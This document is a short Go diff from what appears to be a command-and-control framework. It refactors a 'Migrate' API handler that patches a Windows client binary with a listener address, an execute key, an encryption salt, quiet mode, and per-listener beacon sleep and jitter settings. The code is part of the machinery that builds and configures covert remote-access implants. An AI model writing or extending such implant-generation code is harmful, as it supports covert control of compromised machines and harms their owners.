@@ -1,7 +1,6 @@
 package api
 
 import (
-	"BackendTemplate/pkg/config"
 	"BackendTemplate/pkg/connection"
 	"BackendTemplate/pkg/database"
 	"BackendTemplate/pkg/delivery"
@@ -13,7 +12,6 @@ import (
 	"encoding/hex"
 	"fmt"
 	"net/http"
-	"strconv"
 	"strings"
 	"time"
 
@@ -118,22 +116,21 @@ func Migrate(c *gin.Context) {
 	rand.Read(executeKeyBytes)
 	executeKey := hex.EncodeToString(executeKeyBytes)
 
-	jitterStr := ""
-	if g := config.GetGlobalConfig(); g != nil && g.Client.Jitter >= 0 && g.Client.Jitter <= 50 {
-		jitterStr = strconv.Itoa(g.Client.Jitter)
-	}
-
-	patched, err := delivery.PatchClientBinary(binaryData, delivery.PatchOptions{
+	beaconSleep, beaconJitter := listenerBeaconOverrides(listener)
+	opts := delivery.PatchOptions{
 		ListenerConfig: listenerType + "://" + connectAddress,
 		OS:             "windows",
 		Arch:           archType,
 		Pass:           executeKey,
 		VKey:           string(vkey),
 		EncryptSalt:    string(salt),
-		JitterPercent:  jitterStr,
+		SleepSeconds:   beaconSleep,
+		JitterPercent:  beaconJitter,
 		QuietMode:      "1",
 		Format:         "raw",
-	})
+	}
+	applyListenerProfileRecord(&opts, listener)
+	patched, err := delivery.PatchClientBinary(binaryData, opts)
 	if err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "重建客户端失败: " + err.Error()})
 		return
